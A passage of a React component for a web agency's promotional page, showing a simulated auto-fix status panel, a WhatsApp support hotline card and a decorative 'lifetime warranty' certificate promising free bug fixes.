                {rectifyState === 'fixing' && 'AUTO-RECTIFYING'}
                {rectifyState === 'rectified' && 'RESOLVED (₹0)'}
              </span>
            </div>

            <div className="rect-message">
              {rectifyState === 'clean' && (
                <span>24/7 Production Monitor: 100% healthy, zero defects reported.</span>
              )}
              {rectifyState === 'fixing' && (
                <span className="text-orange">
                  ⚡ Routine check detected Safari CSS variance. Resolving via Hotline...
                </span>
              )}
              {rectifyState === 'rectified' && (
                <span className="text-green">
                  ✓ Anomaly rectified in 6 mins. Fee to client: <strong>₹0.00</strong> (Guaranteed).
                </span>
              )}
            </div>
          </div>

          {/* Direct Senior Hotline Card */}
          <div className="deploy-hotline-card">
            <div className="hotline-icon">📞</div>
            <div className="hotline-details">
              <div className="hotline-title">DIRECT SENIOR HOTLINE &bull; WHATSAPP</div>
              <div className="hotline-number">+91 99529 34596</div>
              <div className="hotline-sub">&lt; 15-Minute Response SLA &bull; ₹0 Bug Fix Anytime Guarantee</div>
            </div>
          </div>
        </div>

        {/* Right Side: Authentic Signed Lifetime Warranty Certificate */}
        <div className="warranty-cert-panel">
          <div className={`warranty-cert-card ${launchCyclePhase === 'warranty' ? 'stamp-highlight' : ''}`}>
            <div className="cert-top-emblem">
              <div className="cert-seal">
                <span className="seal-star">★</span>
                <span className="seal-text">PRISMLINE</span>
                <span className="seal-star">★</span>
              </div>
            </div>

            <div className="cert-header">
              <div className="cert-title">OFFICIAL LIFETIME WARRANTY</div>
              <div className="cert-number">CERTIFICATE NO: PLT-WARRANTY-2026-ACTIVE</div>
            </div>

            <div className="cert-body-clauses">
              <div className="cert-clause">
                <span className="clause-check">✓</span>
                <div>
                  <strong>₹0 Bug Rectification:</strong> Any defect or bug within delivered scope is resolved with zero client fees.
                </div>
              </div>
              <div className="cert-clause">
                <span className="clause-check">✓</span>
                <div>
                  <strong>100% Code Ownership:</strong> Full Git repository transferred to client. Zero vendor lock-in.
                </div>
              </div>
              <div className="cert-clause">
                <span className="clause-check">✓</span>
                <div>
                  <strong>Direct WhatsApp Access:</strong> Chat directly with your lead engineers anytime post-launch.
                </div>
              </div>
            </div>

            <div className="cert-footer-signature">
              <div className="sig-line">
                <span className="sig-label">AUTHORIZED SIGNATURE</span>
                <span className="sig-hash">HASH #8F29-GUARANTEED-LIFETIME</span>
              </div>
              <span className="sig-badge">SEAL VERIFIED ✓</span>
            </div>
          </div>
        </div>
      </div>

      {/* Console Footer */}
      <div className="mac-app-footer">
        <span>STATUS: ZERO DOWNTIME RELEASE &bull; LIFETIME ₹0 RECTIFICATION GUARANTEE</span>
      </div>
    </div>
  );
}

